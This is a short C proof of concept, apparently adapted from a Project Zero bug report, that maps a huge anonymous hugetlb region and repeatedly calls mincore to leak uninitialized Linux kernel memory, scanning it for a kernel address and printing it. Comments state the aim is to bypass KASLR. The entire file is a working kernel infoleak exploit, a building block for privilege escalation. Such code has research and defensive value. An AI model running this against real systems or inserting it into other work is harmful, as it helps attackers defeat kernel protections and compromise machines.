/*
 * The source is modified from
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1431
 * I try to find out infomation useful from the infoleak
 * The kernel address can be easily found out from the uninitialized memory
 * leaked from kernel, which can help bypass kaslr
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <sys/mman.h>
#include <err.h>
#include <stdio.h>

int main(void) {
  unsigned char buf[getpagesize()/sizeof(unsigned char)];
  int right = 1;
  unsigned long addr = 0;

  /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */
  if (mmap((void*)0x66000000, 0x20000000000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1, 0) == MAP_FAILED)
    err(1, "mmap");

  while(right){
    /* Touch a mishandle with this type mapping */
    if (mincore((void*)0x86000000, 0x1000000, buf))
      perror("mincore");
    for( int n=0; n<getpagesize()/sizeof(unsigned char); n++) {
      addr = *(unsigned long*)(&buf[n]);
      /* Kernel address space, may need some mask&offset */
      if(addr > 0xffffffff00000000){
	right = 0;
	goto out;
      }
    }
  }
 out:
  printf("%p\n", addr);
  return 0;
}